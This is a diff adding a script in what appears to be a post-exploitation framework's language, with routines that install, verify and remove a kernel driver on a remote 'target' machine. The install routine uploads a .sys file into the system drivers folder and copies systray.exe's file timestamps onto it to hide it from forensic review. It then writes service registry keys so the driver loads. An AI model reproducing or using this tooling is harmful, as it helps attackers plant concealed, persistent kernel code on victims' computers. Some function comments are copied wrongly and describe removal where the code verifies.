@@ -1,0 +1,354 @@
+@include "_FileExists.epm";
+@include "_GetSystemPaths.epm";
+
+#--------------------------------------------------------------------------
+# _DriverInstall
+#	Copies driver to target and creates registry settings.
+# 
+# Params:
+#	IN STRING $drvName
+#		Name of Driver
+#	IN STRING $localDriverName
+#		Local name of the driver relative to the "Resources" dir
+#	IN INT $startValue
+#		Start value for driver (registry value)
+#	IN INT $typeValue
+#		Type of driver (registry value)
+#--------------------------------------------------------------------------
+sub _DriverInstall(IN STRING $drvName, 
+		   IN STRING $localDriverName,
+		   IN INT $startValue,
+		   IN INT $typeValue)
+{
+	
+	if ($drvName == "") {
+		echo "* Invalid driver name given";
+		return false;
+	}
+
+	ifnot (prompt "Do you want to install $localDriverName\\$drvName?") {
+		return false;
+	}
+
+
+	@record on;
+
+	# get the root directory
+	string $system;
+	string $root;
+	ifnot (_GetSystemPaths($system, $root)) {
+		echo "* Unable to determine system root";
+		return false;
+	}
+	string $systemroot = "$system\\$root";
+
+	# get resource directory
+	ifnot (`getdirectory -resources`) {
+		echo "* Unable to get resources directory";
+		return false;
+	}
+
+	string $resDir = GetCmdData("dir");
+	ifnot (defined($resDir[0])) {
+		echo "* Unable to retrieve resources directory";
+		return false;
+	}
+	
+	string $resPath = "$resDir\\$localDriverName";
+
+	@record off;
+
+	# make sure it's not already installed
+	if (`regquery -hive L -subkey SYSTEM\\CurrentControlSet\\Services\\$drvName`) {
+		echo "$drvName is already installed (key exists)";
+		return false;
+	}
+
+	if (_FileExists("$drvName.sys", "$systemroot\\drivers")) {
+		echo "$drvName is already installed (file exists)";
+		return false;
+	}
+
+	#---------------------------
+	# Driver not installed
+	#---------------------------
+
+	# put the driver
+	echo "Uploading the SYS";
+	
+	if (`put "$resPath\\$drvName.sys" -name "$systemroot\\drivers\\$drvName.sys" -permanent`) {
+		echo "    SUCCESS";
+	} else {
+		echo "    FAILED";
+		return false;
+	}
+
+	# match file times for driver
+	echo "Matching file time for SYS";
+	if (`matchtimes "$systemroot\\systray.exe" "$systemroot\\drivers\\$drvName.sys"`) {
+		echo "    SUCCESS";
+	} else {
+		echo "    FAILED (but continuing anyway)";
+	}
+
+	# add the registry keys
+	bool $keysAdded = true;
+	echo "Adding registry keys";
+	ifnot (`regadd -hive L -key SYSTEM\\CurrentControlSet\\Services\\$drvName -value ErrorControl -type REG_DWORD -data 0`) {
+	    $keysAdded = false;
+	} else ifnot (`regadd -hive L -key SYSTEM\\CurrentControlSet\\Services\\$drvName -value Start -type REG_DWORD -data $startValue`) {
+	    $keysAdded = false;
+	} else ifnot (`regadd -hive L -key SYSTEM\\CurrentControlSet\\Services\\$drvName -value Type -type REG_DWORD -data $typeValue`) {
+	    $keysAdded = false;
+	}
+
+	if ($keysAdded == false) {
+	    echo "    FAILED";
+	    return false;
+	} else {
+	    echo "    SUCCESS";
+	}
+
+
+
+	return true;
+
+}	/* end _DriverInstall */
+
+#--------------------------------------------------------------------------
+# _DriverUnInstall
+#	Called by DriverMenu to remove the driver from the target and
+#	cleanup registry settings.
+# 
+# Params:
+#	IN STRING $drvName
+#		Name of Driver
+#--------------------------------------------------------------------------
+sub _DriverUnInstall(IN STRING $drvName)
+{
+	
+	bool $rtn = true;
+
+	if ($drvName == "") {
+		echo "Invalid driver name given";
+		return false;
+	}
+
+	ifnot (prompt "Do you want to uninstall $drvName?") {
+		return false;
+	}
+
+	# get the root directory
+	string $system;
+	string $root;
+	ifnot (_GetSystemPaths($system, $root)) {
+		echo "* Unable to determine system root";
+		return false;
+	}
+	string $systemroot = "$system\\$root";
+
+	echo "Unloading driver";
+	if (`driverunload -name $drvName`) {
+		echo "    PASSED";
+	} else {
+		echo "    FAILED";
+		$rtn = false;
+	}
+
+	echo "Removing registry key";
+	## NOTE- for recursion - Minimum operating systems Windows 2000, Windows NT 4.0 with Internet Explorer 4.0, Windows 98,
+	## Windows 95 with Internet Explorer 4.0
+	## if recursion fails, delete each subkey first ie Enum, then $drvname 
+	if (`regdelkey -hive L -key SYSTEM\\CurrentControlSet\\Services\\$drvName -recursive`) {
+		echo "    PASSED";
+	} else {
+		echo "    FAILED";
+		$rtn = false;
+
+	}
+
+	echo "Removing $drvName.sys";
+	if (`del $drvName.sys -path "$systemroot\\drivers"`) {
+		echo "    PASSED";
+	} else {
+		echo "    FAILED";
+		$rtn = false;
+		
+	}
+
+	return $rtn;
+
+}	/* end _DriverUninstall */
+
+#--------------------------------------------------------------------------
+# _DriverVerifyInstall
+#	Called by DriverMenu to remove the driver from the target and
+#	cleanup registry settings.
+# 
+# Params:
+#	IN STRING $drvName
+#		Name of Driver
+#	IN INT $startValue
+#		Start value for driver (registry value)
+#	IN INT $typeValue
+#		Type of driver (registry value)
+#--------------------------------------------------------------------------
+sub _DriverVerifyInstall(IN STRING $drvName, 
+			 IN INT $startValue,
+			 IN INT $typeValue)
+{
+
+
+	if ($drvName == "") {
+		echo "* Invalid driver name given";
+		return false;
+	}
+
+	# get the root directory
+	string $system;
+	string $root;
+	ifnot (_GetSystemPaths($system, $root)) {
+		echo "* Unable to determine system root";
+		return false;
+	}
+	string $systemroot = "$system\\$root";
+
+	bool $rtn = true;
+	echo "Checking for $drvName.sys";
+	if (_FileExists("$drvName.sys", "$systemroot\\drivers")) {
+		echo "    PASSED";
+	} else {
+		echo "    FAILED";
+		$rtn = false;
+	}
+
+	@record on;
+
+	echo "Checking for key";
+	if (`regquery -hive L -subkey SYSTEM\\CurrentControlSet\\Services\\$drvName`) {
+		echo "    PASSED";
+	} else {
+		echo "    FAILED";
+		$rtn = false;
+	}
+
+	echo "Checking for key/ErrorControl";
+	if (`regquery -hive L -subkey SYSTEM\\CurrentControlSet\\Services\\$drvName -value ErrorControl`) {
+	    # got key -- check value
+	    bool $valueGood = false;
+	    string $type = GetCmdData("value_type");
+	    if ($type == "REG_DWORD") {
+		string $data = GetCmdData("value_data");
+		if ((StrLen($data) > 0) && (<int>$data == 0)) {
+		    $valueGood = true;
+		}
+	    }
+
+	    if ($valueGood) {
+		echo "    PASSED";
+	    } else {
+		echo "    FAILED (value is bad)";
+		$rtn = false;
+	    }	
+	} else {
+	    echo "    FAILED (value not found)";
+	    $rtn = false;
+	}
+
+	echo "Checking for key/Start";
+	if (`regquery -hive L -subkey SYSTEM\\CurrentControlSet\\Services\\$drvName -value Start`) {
+	    # got key -- check value
+	    bool $valueGood = false;
+	    string $type = GetCmdData("value_type");
+	    if ($type == "REG_DWORD") {
+		string $data = GetCmdData("value_data");
+		if ((StrLen($data) > 0) && (<int>$data == $startValue)) {
+		    $valueGood = true;
+		}
+	    }
+
+	    if ($valueGood) {
+		echo "    PASSED";
+	    } else {
+		echo "    FAILED (value is bad)";
+		$rtn = false;
+	    }	
+	} else {
+	    echo "    FAILED (value not found)";
+	    $rtn = false;
+	}
+
+	echo "Checking for key/Type";
+	if (`regquery -hive L -subkey SYSTEM\\CurrentControlSet\\Services\\$drvName -value Type`) {
+	    # got key -- check value
+	    bool $valueGood = false;
+	    string $type = GetCmdData("value_type");
+	    if ($type == "REG_DWORD") {
+		string $data = GetCmdData("value_data");
+		if ((StrLen($data) > 0) && (<int>$data == $typeValue)) {
+		    $valueGood = true;
+		}
+	    }
+
+	    if ($valueGood) {
+		echo "    PASSED";
+	    } else {
+		echo "    FAILED (value is bad)";
+		$rtn = false;
+	    }	
+	} else {
+	    echo "    FAILED (value not found)";
+	    $rtn = false;
+	}
+
+	return $rtn;
+
+}	/* end _DriverVerifyInstall */
+
+#--------------------------------------------------------------------------
+# _DriverVerifyRunning
+#	Called by DriverMenu to remove the driver from the target and
+#	cleanup registry settings.
+# 
+# Params:
+#	IN STRING $drvName
+#		Name of Driver
+#--------------------------------------------------------------------------
+sub _DriverVerifyRunning(IN STRING $drvName)
+{
+
+	if ($drvName == "") {
+		echo "Invalid driver name given";
+		return false;
+	}
+
+	@record on;
+
+	echo "Getting driver list";
+	if (`driverlist`) {
+		echo "    PASSED";
+	} else {
+		echo "    FAILED (query of running drivers failed)";
+		return false;
+	}
+
+	string $names = GetCmdData("name");
+
+	echo "Checking for $drvName";
+	int $i=0;
+	while ($i < sizeof($names)) {
+		string $namePieces = SplitPath($names[$i]);
+		if (defined($namePieces[1])) {
+		    if (($namePieces[1] == $drvName) || ($namePieces[1] == "$drvName.sys")) {
+			echo "    PASSED";
+			return true;
+		    }
+		}
+		$i++;
+	}
+
+	echo "    FAILED (driver not running)";
+	return false;
+
+}	/* end _DriverVerifyRunning */
+
